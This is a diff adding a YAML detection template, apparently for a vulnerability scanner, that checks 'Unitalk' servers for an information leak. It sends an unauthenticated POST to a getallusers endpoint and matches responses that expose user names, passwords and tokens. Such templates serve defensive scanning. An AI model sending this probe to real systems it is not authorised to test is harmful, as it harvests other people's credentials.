@@ -1,0 +1,31 @@
+id: poc-yaml-unitalk-getallusers-info-leak
+info:
+  name: Unitalk GetAllUsers Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: POST
+    path:
+      - "/unitalk/v1.0/user/getallusers.json"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: "{}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\\"name\\\":\\\"[0-9a-zA-Z]+\\\""
+          - "\\\"pwd\\\":\\\"[0-9a-zA-Z]+\\\""
+          - "\\\"token\\\":\\\"[0-9a-zA-Z-]+\\\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        negative: true
+        words:
+          - "<"
